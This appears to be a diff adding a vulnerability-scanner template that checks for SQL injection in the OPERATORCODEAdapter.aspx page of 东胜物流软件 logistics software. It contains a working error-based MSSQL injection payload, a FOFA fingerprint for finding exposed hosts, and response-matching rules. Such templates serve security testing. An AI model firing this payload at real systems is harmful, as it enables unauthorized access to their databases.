@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-operatorcodeadapter-sqli
+info:
+  name: 东胜物流软件 OPERATORCODEAdapter SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_int(1,100000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /FeeCodes/OPERATORCODEAdapter.aspx?SHOWNAME=1&CUSTOMERNAME=-1%27%29%20AND%201234%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,t2)
+transport: http
